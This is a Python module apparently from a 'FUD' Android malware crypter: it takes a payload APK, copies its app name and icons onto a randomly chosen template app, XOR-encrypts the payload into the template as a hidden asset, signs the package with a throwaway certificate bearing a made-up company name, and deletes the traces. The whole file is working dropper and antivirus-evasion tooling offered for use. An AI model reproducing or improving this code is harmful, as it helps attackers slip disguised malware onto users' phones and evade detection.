"""FUD pipeline — payload label+icon override + variant pick + sign + cleanup."""
import os
import re
import glob
import random
import shutil
import subprocess
import time
import zipfile
from xml.sax.saxutils import escape as xml_escape

from config import (
    PAYLOAD_XOR_KEY, VARIANTS_DIR, TEMPLATE_APK, KEYSTORE_DIR,
    KEYSTORE_PASS, KEY_ALIAS, APKSIGNER_BIN, ZIPALIGN_BIN,
    JAVA_BIN, APKTOOL_JAR, AAPT2_BIN,
)
from setup import ensure_tools


def _step(session_dir, msg):
    try:
        with open(os.path.join(session_dir, "step.txt"), "w") as f:
            f.write(msg)
    except Exception:
        pass
    print(f"\n===== {msg} =====", flush=True)


def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    out = bytearray(len(data))
    klen = len(key)
    for i, b in enumerate(data):
        idx = (i * 7 + 3) % klen
        out[i] = (b ^ key[idx]) & 0xFF
    return bytes(out)


def _pick_template() -> str:
    variants = []
    if os.path.isdir(VARIANTS_DIR):
        variants = sorted(glob.glob(os.path.join(VARIANTS_DIR, "*.apk")))
    if variants:
        pick = random.choice(variants)
        print(f"[i] variant: {os.path.basename(pick)}", flush=True)
        return pick
    if os.path.exists(TEMPLATE_APK):
        print("[i] fallback template.apk", flush=True)
        return TEMPLATE_APK
    raise RuntimeError("no template")


def _java_env() -> dict:
    env = os.environ.copy()
    jhome = os.path.dirname(os.path.dirname(JAVA_BIN))
    env["JAVA_HOME"] = jhome
    env["PATH"] = os.path.dirname(JAVA_BIN) + os.pathsep + env.get("PATH", "")
    return env


# ---------------------------------------------------------------- payload introspection

def _get_payload_label(apk_path: str):
    """aapt2 dump badging se application-label nikalo."""
    if not os.path.exists(AAPT2_BIN):
        print("[!] aapt2 missing, label patch skipped", flush=True)
        return None
    try:
        p = subprocess.run(
            [AAPT2_BIN, "dump", "badging", apk_path],
            capture_output=True, text=True, timeout=60, env=_java_env(),
        )
    except Exception as e:
        print(f"[!] aapt2 dump failed: {e}", flush=True)
        return None

    if p.returncode != 0:
        print(f"[!] aapt2 rc={p.returncode}: {p.stderr[:200]}", flush=True)
        return None

    fallback = None
    for line in p.stdout.splitlines():
        if line.startswith("application-label:"):
            lbl = line.split(":", 1)[1].strip().strip("'\"")
            if lbl:
                return lbl
        elif line.startswith("application-label-") and fallback is None:
            lbl = line.split(":", 1)[1].strip().strip("'\"")
            if lbl:
                fallback = lbl
    return fallback


def _extract_icons(payload_apk: str) -> dict:
    icons = {}
    try:
        with zipfile.ZipFile(payload_apk, "r") as z:
            for n in z.namelist():
                ln = n.lower()
                if not n.startswith("res/"):
                    continue
                if "ic_launcher" not in ln and "/mipmap" not in ln:
                    continue
                if not ln.endswith((".png", ".webp", ".jpg", ".jpeg")):
                    continue
                try:
                    icons[n] = z.read(n)
                except Exception:
                    pass
    except Exception:
        pass
    return icons


# ---------------------------------------------------------------- template label patch

def _patch_strings_xml(decompiled_dir: str, str_name: str, new_label: str) -> bool:
    """res/values*/strings.xml me <string name="str_name"> badlo."""
    values_root = os.path.join(decompiled_dir, "res")
    if not os.path.isdir(values_root):
        return False

    pat = re.compile(
        r'(<string[^>]*\bname="' + re.escape(str_name) + r'"[^>]*>)(.*?)(</string>)',
        re.DOTALL,
    )
    patched = False

    for entry in os.listdir(values_root):
        if not entry.startswith("values"):
            continue
        sp = os.path.join(values_root, entry, "strings.xml")
        if not os.path.exists(sp):
            continue
        try:
            with open(sp, "r", encoding="utf-8") as f:
                txt = f.read()
        except Exception:
            continue
        new_txt, n = pat.subn(
            lambda m: m.group(1) + xml_escape(new_label) + m.group(3),
            txt,
        )
        if n > 0:
            with open(sp, "w", encoding="utf-8") as f:
                f.write(new_txt)
            patched = True
    return patched


def _patch_manifest_label(decompiled_dir: str, new_label: str):
    """Manifest ke android:label ko new_label se replace."""
    mpath = os.path.join(decompiled_dir, "AndroidManifest.xml")
    if not os.path.exists(mpath):
        return
    with open(mpath, "r", encoding="utf-8") as f:
        xml = f.read()

    m = re.search(r'<application\b[^>]*\bandroid:label="([^"]*)"', xml)
    if not m:
        print("[!] application label attr not found in manifest", flush=True)
        return
    cur = m.group(1)

    if cur.startswith("@string/"):
        str_name = cur.split("/", 1)[1]
        ok = _patch_strings_xml(decompiled_dir, str_name, new_label)
        if ok:
            print(f"[✓] label patched via @string/{str_name} → {new_label!r}", flush=True)
        else:
            # string resource mila hi nahi — manifest me literal daal do
            xml = xml.replace(f'android:label="{cur}"',
                              f'android:label="{xml_escape(new_label)}"')
            with open(mpath, "w", encoding="utf-8") as f:
                f.write(xml)
            print(f"[!] string {str_name} not found — literal injected", flush=True)
    else:
        xml = xml.replace(f'android:label="{cur}"',
                          f'android:label="{xml_escape(new_label)}"')
        with open(mpath, "w", encoding="utf-8") as f:
            f.write(xml)
        print(f"[✓] literal label replaced: {cur!r} → {new_label!r}", flush=True)


def _apktool_d(apk: str, out: str):
    if os.path.exists(out):
        shutil.rmtree(out)
    subprocess.run(
        [JAVA_BIN, "-Xmx2g", "-jar", APKTOOL_JAR, "d", "-f",
         "-o", out, apk],
        check=True, capture_output=True, timeout=900, env=_java_env(),
    )


def _apktool_b(src: str, out: str):
    if os.path.exists(out):
        os.remove(out)
    subprocess.run(
        [JAVA_BIN, "-Xmx2g", "-jar", APKTOOL_JAR, "b",
         src, "-o", out],
        check=True, capture_output=True, timeout=900, env=_java_env(),
    )


def _patch_template_label(template_apk: str, new_label: str, work_dir: str) -> str:
    """Template decompile → label patch → recompile. Returns patched apk path."""
    if not new_label:
        return template_apk

    decomp = os.path.join(work_dir, "tpl_d")
    patched_apk = os.path.join(work_dir, "tpl_patched.apk")

    print(f"[*] patching template label → {new_label!r}", flush=True)
    _apktool_d(template_apk, decomp)
    _patch_manifest_label(decomp, new_label)
    _apktool_b(decomp, patched_apk)
    shutil.rmtree(decomp, ignore_errors=True)
    print(f"[✓] template label patched", flush=True)
    return patched_apk


# ---------------------------------------------------------------- signing

def _generate_keystore() -> str:
    os.makedirs(KEYSTORE_DIR, exist_ok=True)
    ks = os.path.join(KEYSTORE_DIR,
                      f"k_{int(time.time())}_{random.randint(1000,9999)}.p12")

    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12
    import datetime

    key = rsa.generate_private_key(public_exponent=65537, key_size=4096)

    org_pool = [
        "CyberLink Solutions", "Nexa Systems", "ByteForge",
        "Quantum Apps", "DeltaSoft", "Vertex Labs", "Aurora Interactive",
        "Ironclad Mobile", "Solaris Tech", "Northwind Digital",
    ]
    loc_pool = [
        ("US", "California", "San Jose"),
        ("US", "Texas", "Austin"),
        ("US", "Washington", "Seattle"),
        ("GB", "England", "London"),
        ("DE", "Berlin", "Berlin"),
        ("FR", "Ile-de-France", "Paris"),
        ("NL", "North Holland", "Amsterdam"),
        ("SE", "Stockholm", "Stockholm"),
        ("JP", "Tokyo", "Tokyo"),
        ("CA", "Ontario", "Toronto"),
    ]
    country, state, city = random.choice(loc_pool)
    org = random.choice(org_pool)
    ou_pool = ["Mobile", "Engineering", "Apps", "Development", "Product", "Client"]
    cn_pool = ["Android", "Mobile App", "App Developer", "Mobile Client", "Application"]

    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME,             country),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME,   state),
        x509.NameAttribute(NameOID.LOCALITY_NAME,            city),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME,        org),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, random.choice(ou_pool)),
        x509.NameAttribute(NameOID.COMMON_NAME,              random.choice(cn_pool)),
    ])
    now = datetime.datetime.utcnow()
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject).issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=10950))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .sign(key, hashes.SHA384())
    )
    p12 = pkcs12.serialize_key_and_certificates(
        name=KEY_ALIAS.encode(), key=key, cert=cert, cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(KEYSTORE_PASS.encode()),
    )
    with open(ks, "wb") as f:
        f.write(p12)
    return ks


def _sign(unsigned_apk: str, output_apk: str):
    ks = _generate_keystore()
    aligned = unsigned_apk + ".aligned"
    env = _java_env()

    subprocess.run(
        [ZIPALIGN_BIN, "-f", "-p", "4", unsigned_apk, aligned],
        check=True, capture_output=True, timeout=120, env=env,
    )

    cmd = [
        APKSIGNER_BIN, "sign",
        "--ks", ks,
        "--ks-pass", f"pass:{KEYSTORE_PASS}",
        "--ks-key-alias", KEY_ALIAS,
        "--key-pass", f"pass:{KEYSTORE_PASS}",
        "--v1-signing-enabled", "true",
        "--v2-signing-enabled", "true",
        "--v3-signing-enabled", "true",
        "--v4-signing-enabled", "true",
        "--out", output_apk,
        aligned,
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=300, env=env)
    if p.returncode != 0:
        raise RuntimeError(f"apksigner: {p.stdout} {p.stderr}")

    if os.path.exists(aligned):
        os.remove(aligned)
    try:
        if os.path.exists(ks):
            os.remove(ks)
    except Exception:
        pass


# ---------------------------------------------------------------- main pipeline

def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
                              output_apk: str, session_dir: str) -> str:
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    if not template_apk or not os.path.exists(template_apk):
        template_apk = _pick_template()

    _step(session_dir, "1/4 read payload label + icons")
    payload_label = _get_payload_label(payload_apk)
    icons = _extract_icons(payload_apk)
    print(f"[i] payload label: {payload_label!r}, {len(icons)} icons", flush=True)

    _step(session_dir, "2/4 patch template label")
    tpl_work = os.path.join(session_dir, "tpl_work")
    os.makedirs(tpl_work, exist_ok=True)
    try:
        template_patched = _patch_template_label(
            template_apk, payload_label, tpl_work
        )
    except Exception as e:
        print(f"[!] label patch failed, using raw template: {e}", flush=True)
        template_patched = template_apk

    _step(session_dir, "3/4 encrypt payload + rebuild apk")
    with open(payload_apk, "rb") as f:
        payload_bytes = f.read()
    encrypted = _xor_encrypt(payload_bytes, PAYLOAD_XOR_KEY)
    print(f"[i] payload {len(payload_bytes)}b encrypted", flush=True)

    unsigned = os.path.join(session_dir, "unsigned.apk")
    with zipfile.ZipFile(template_patched, "r") as zin, \
         zipfile.ZipFile(unsigned, "w", zipfile.ZIP_DEFLATED) as zout:

        template_names = set(zin.namelist())

        for item in zin.infolist():
            fn = item.filename
            if fn.startswith("META-INF/") or fn == "assets/output.apk":
                continue
            if fn in icons:
                zout.writestr(item, icons[fn])
                continue
            try:
                data = zin.read(fn)
            except Exception:
                continue
            if fn.endswith(".dex") or fn == "resources.arsc" or fn == "AndroidManifest.xml":
                zout.writestr(item, data, compress_type=zipfile.ZIP_STORED)
            else:
                zout.writestr(item, data)

        for fn, data in icons.items():
            if fn not in template_names:
                zout.writestr(fn, data)

        info = zipfile.ZipInfo("assets/output.apk")
        info.compress_type = zipfile.ZIP_STORED
        zout.writestr(info, encrypted)

    _step(session_dir, "4/4 sign")
    _sign(unsigned, output_apk)

    try:
        if os.path.exists(unsigned):
            os.remove(unsigned)
        if os.path.exists(payload_apk):
            os.remove(payload_apk)
        shutil.rmtree(tpl_work, ignore_errors=True)
    except Exception:
        pass

    _step(session_dir, "done")
    print(f"[✓] DONE → {output_apk}", flush=True)
    return output_apk


def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)
    tmp = output_apk + ".unsigned"
    shutil.copy2(input_apk, tmp)
    _sign(tmp, output_apk)
    if os.path.exists(tmp):
        os.remove(tmp)
    if os.path.exists(input_apk):
        os.remove(input_apk)
    return output_apk
